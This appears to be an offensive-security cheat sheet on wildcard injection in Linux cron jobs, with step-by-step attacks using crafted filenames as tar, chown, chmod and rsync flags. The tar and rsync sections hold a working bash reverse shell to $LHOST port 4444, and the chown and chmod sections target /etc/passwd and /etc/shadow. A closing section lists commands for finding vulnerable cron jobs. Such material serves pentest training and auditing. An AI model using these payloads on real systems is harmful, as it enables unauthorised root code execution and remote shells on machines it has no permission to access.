# Wildcard Injection

Abuse wildcard expansion in cron jobs and scripts for privilege escalation.

---

### How it works

When a script uses wildcards (*) with commands like tar, chown, or rsync — Filenames are interpreted as flags

```bash
# If a cron job runs:
cd /opt/backup && tar czf /tmp/backup.tar.gz *

# And you create files named like tar flags:
touch "/opt/backup/--checkpoint=1"
touch "/opt/backup/--checkpoint-action=exec=sh shell.sh"

# tar interprets the filenames as arguments = RCE as the cron user
```

---

### Tar wildcard injection (most common)

Exploit tar with checkpoint options — Execute arbitrary commands

```bash
# 1. Create your reverse shell script:
echo '#!/bin/bash' > /opt/backup/shell.sh
echo 'bash -i >& /dev/tcp/$LHOST/4444 0>&1' >> /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh

# 2. Create the malicious filenames:
touch "/opt/backup/--checkpoint=1"
touch "/opt/backup/--checkpoint-action=exec=sh shell.sh"

# 3. Wait for cron to run tar * → triggers your shell
```

---

### Chown wildcard injection

Exploit chown with --reference flag — Change file ownership

```bash
# If cron runs: chown user:group *

# Create a file owned by root that you want to own:
touch -- "--reference=/etc/passwd"
# chown will use /etc/passwd's ownership as reference
```

---

### Chmod wildcard injection

Exploit chmod with --reference flag — Change file permissions

```bash
# If cron runs: chmod 755 *

touch -- "--reference=/etc/shadow"
# chmod will copy /etc/shadow's permissions to all files
```

---

### Rsync wildcard injection

Exploit rsync with -e flag — Execute arbitrary commands

```bash
# If cron runs: rsync -a * /backup/

touch -- "-e sh shell.sh"
echo '#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/4444 0>&1' > shell.sh
chmod +x shell.sh
```

---

### How to detect

Look for wildcards in cron jobs and scripts

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Look for lines like:
# * * * * * root cd /dir && tar czf backup.tar.gz *
# * * * * * root chown user:group /dir/*

# Check writable directories that cron operates on:
find / -writable -type d 2>/dev/null
```

---
